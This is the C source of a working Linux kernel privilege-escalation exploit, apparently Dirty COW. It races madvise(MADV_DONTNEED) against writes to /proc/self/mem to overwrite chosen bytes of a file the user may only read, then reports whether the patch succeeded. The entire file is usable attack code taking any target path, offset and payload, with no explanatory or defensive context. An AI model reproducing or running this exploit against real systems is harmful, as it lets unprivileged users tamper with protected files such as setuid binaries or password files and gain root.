#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static unsigned char *map_addr;
static size_t map_len;
static size_t patch_offset;
static unsigned char *patch_data;
static size_t patch_len;
static volatile int stop_race;

static void *madvise_thread(void *unused) {
    unsigned long i;
    (void)unused;
    for (i = 0; i < 20000000UL && !stop_race; i++) {
        madvise(map_addr, map_len, MADV_DONTNEED);
    }
    return NULL;
}

static void *proc_mem_thread(void *unused) {
    int fd;
    unsigned long i;
    (void)unused;
    fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) {
        perror("open /proc/self/mem");
        return NULL;
    }
    for (i = 0; i < 20000000UL && !stop_race; i++) {
        off_t where = (off_t)(uintptr_t)(map_addr + patch_offset);
        if (lseek(fd, where, SEEK_SET) == (off_t)-1) continue;
        write(fd, patch_data, patch_len);
    }
    close(fd);
    return NULL;
}

static int read_file(const char *path, unsigned char **data, size_t *len) {
    int fd = open(path, O_RDONLY);
    size_t cap = 4096, used = 0;
    ssize_t got;
    if (fd < 0) return -1;
    *data = malloc(cap);
    if (!*data) { close(fd); return -1; }
    while ((got = read(fd, *data + used, cap - used)) > 0) {
        used += (size_t)got;
        if (used == cap) {
            cap *= 2;
            *data = realloc(*data, cap);
            if (!*data) { close(fd); return -1; }
        }
    }
    close(fd);
    if (got < 0 || used == 0) { free(*data); return -1; }
    *len = used;
    return 0;
}

int main(int argc, char **argv) {
    const char *target;
    const char *patch_path;
    int fd;
    off_t end;
    pthread_t t1, t2;
    unsigned char *check;
    size_t check_len;
    int ok;

    if (argc != 4) {
        fprintf(stderr, "usage: %s TARGET OFFSET PATCH_FILE\n", argv[0]);
        return 2;
    }
    target = argv[1];
    patch_offset = (size_t)strtoul(argv[2], NULL, 0);
    patch_path = argv[3];
    if (read_file(patch_path, &patch_data, &patch_len) != 0) {
        perror("read patch");
        return 2;
    }
    fd = open(target, O_RDONLY);
    if (fd < 0 || (end = lseek(fd, 0, SEEK_END)) <= 0 || lseek(fd, 0, SEEK_SET) < 0) {
        perror("open target");
        return 2;
    }
    map_len = (size_t)end;
    if (patch_offset + patch_len > map_len) {
        fprintf(stderr, "patch outside target\n");
        return 2;
    }
    map_addr = mmap(NULL, map_len, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    if (map_addr == MAP_FAILED) {
        perror("mmap");
        return 2;
    }
    printf("target=%s map=%p len=%lu offset=0x%lx patch=%lu bytes\n",
           target, map_addr, (unsigned long)map_len,
           (unsigned long)patch_offset, (unsigned long)patch_len);
    pthread_create(&t1, NULL, madvise_thread, NULL);
    pthread_create(&t2, NULL, proc_mem_thread, NULL);
    pthread_join(t1, NULL);
    stop_race = 1;
    pthread_join(t2, NULL);
    munmap(map_addr, map_len);

    if (read_file(target, &check, &check_len) != 0) return 2;
    ok = memcmp(check + patch_offset, patch_data, patch_len) == 0;
    free(check);
    printf("%s\n", ok ? "SUCCESS" : "FAIL (kernel patched or race lost)");
    return ok ? 0 : 1;
}
